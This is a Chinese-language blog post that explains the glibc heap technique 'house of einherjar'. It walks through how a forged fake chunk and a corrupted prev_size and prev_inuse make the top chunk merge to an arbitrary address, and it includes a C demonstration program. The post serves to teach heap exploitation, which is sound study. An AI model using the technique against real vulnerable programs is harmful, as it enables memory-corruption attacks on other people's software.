---
layout: post
title: house of enherjar：让top chunk合并到任意位置
category: system/Heap
date: 2023-9-23 21:04:32
---
Heap基础知识
<!-- more -->
[toc]
# house of enherjar

一句话描述该漏洞：在任意地方伪造一个`fake_chunk`，然后通过控制紧邻`top chunk`的`chunk`的`prev_size`和`prev_inuse`位，导致当该`chunk`被释放时会根据`prev_size`直接合并到`fake_chunk`，而由于该`chunk`本身和`top chunk`相连，那么该`fake chunk`又会与`top chunk`合并，导致`top chunk`的指针从`fake chunk`开始，这样一来从`top chunk`申请内存时将申请到`fake chunk`处的内存。如图所示（该图来自于[hollk大佬的博客](https://blog.csdn.net/qq_41202237/article/details/117112930?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169149897016800180659893%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=169149897016800180659893&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-117112930-null-null.268^v1^koosearch&utm_term=house%20of%20force&spm=1018.2226.3001.4450)）：

![image-20230809233712730](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311211714272.png)

该技术用了两个地方的漏洞：

- 若紧挨着`top chunk`的`chunk`被`free`，那么该`chunk`会与`top chunk`合并。
- 当前`chunk`被`free`时，会通过当前`chunk`的`prev_inuse`位来判断前一个`chunk`是否也是`free`状态，若是，那么会进行合并。（像`fastbin`这种不会合并的不包括在内）
- 合并过程是先后向合并（与前面的`chunk`合并），再前向合并（与后面的`chunk`合并，比如`top chunk`）

你需要控制才能完成攻击的：

- 控制紧邻`top chunk`的`chunk`的`prev_inuse`位，以及该`chunk`的`prev_size`。（通常是使用`off by one`）
- 在某处（通常是位于栈上）能够伪造一个`fake chunk`。

笔者本人写了一段`house of enherjar`的代码，如下所示：

```c
/*

        else
        // 假如它的下一个chunk是top chunk，那么和top chunk进行合并
        {
            size += nextsize; // 加上top chunk的大小
            set_head(p, size | PREV_INUSE); // 设置标志位
            av->top = p; // 合并之后的chunk成为新的top chunk
            check_chunk(av, p); // 检查是否合法
        }

*/

#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    long *fake_chunk[0x110]; // 最终我们希望使得这里成为top chunk并申请。
    printf("the addr of fake_chunk is %p.\n", &fake_chunk[0]);

    long *a = malloc(0x100); // 申请一个0x110的small chunk，如此以来它会紧邻top chunk
    long *real_a = a - 2;    // real_a是a的起始地址
    printf("the addr of real_a is %p.\n", real_a);
    printf("so the diff from real_a to fake_chunk is %p.\n", (long)real_a - (long)&fake_chunk[0]);

    // 攻击开始
    real_a[0] = (long)real_a - (long)&fake_chunk[0];         // 修改a的prev_size大小
    real_a[1] = 0x110;                                       // 修改a的prev_inuse为0
    fake_chunk[1] = (long)real_a - (long)&fake_chunk[0] + 1; // 修改fake_chunk的size
    // 在释放的时候，后向合并时会将fake_chunk进行unlink
    // 需要修改fake_chunk的fd bk fd_nextsize bk_nextsize指针来绕过unlink检查
    // unlink有安全检查：P->fd->bk == P, P->bk->fd == P，同时fd_nextsize也是如此
    // 将fake_chunk的指针统统指向本身，绕过一切
    fake_chunk[2] = &fake_chunk[0];
    fake_chunk[3] = &fake_chunk[0];
    fake_chunk[4] = &fake_chunk[0];
    fake_chunk[5] = &fake_chunk[0];

    free(a);                 // 释放chunk a，如此一来先合并fake_chunk，再与top chunk合并
    long *b = malloc(0x100); // 再申请一个chunk
    printf("the addr of new malloc is %p.\n", b - 2);


    // 下面是在堆上伪造的。

    // long *a = malloc(0xf0); // 申请一个大小为0x100的chunk，并且最终我们希望它成为top chunk
    // printf("the addr of chunk a is %p.\n", a - 2);

    // // 接下来，我们申请3个大小为0x100的chunk
    // malloc(0xf0);
    // malloc(0xf0);
    // malloc(0xf0);

    // // 我们再申请最后一个大小为0x100的chunk，那么这个chunk b将会紧邻top chunk
    // long *b = malloc(0xf0);

    // // 攻击
    // b[-2] += 0x400; // 将chunk b的prev_size增大0x400
    // b[-1] = 0x100;  // 修改chunk b 的prev_inuse为0
    // a[-1] = 0x401;  // 修改chunk a的size为0x400
    // a[0] = a - 2;
    // a[1] = a - 2;
    // a[2] = a - 2;
    // a[3] = a - 2;

    // free(b); // 释放 chunk b，这样一来chunk a成为top chunk
    // long *c = malloc(0x100);
    // printf("the addr of chunk c is %p.\n", c - 2);
    return 0;
}
```

# 